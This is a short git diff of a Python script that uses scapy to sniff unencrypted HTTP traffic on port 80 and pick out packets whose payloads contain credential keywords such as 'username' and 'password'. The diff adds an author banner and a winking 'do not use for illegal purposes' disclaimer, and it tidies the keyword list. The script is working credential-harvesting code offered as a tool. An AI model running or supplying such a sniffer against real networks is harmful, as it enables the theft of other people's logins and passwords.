@@ -1,10 +1,16 @@
 #!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+
+##############################################################################
+#                                                                            #
+#                           By Wambugu   Dennis                              #
+#                                                                            #
+##############################################################################
+
+# Disclaimer: Do Not Use this program for illegal purposes ;)
 import scapy.all as scapy
 from scapy.layers import http
 
-
-# created by Wambugu
-# 01-09-2022
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=sniffed_packet, filter="port 80")
@@ -17,7 +23,7 @@ def get_url(packet):
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = str(packet[scapy.Raw].load)
-        words = ["Username", "user", "username",  "uname", "login", "Password", "password", "pass"]
+        words = ["Username", "user", "username", "uname", "login", "Password", "password", "pass"]
         for word_matched in words:
             if word_matched in load:
                 return load
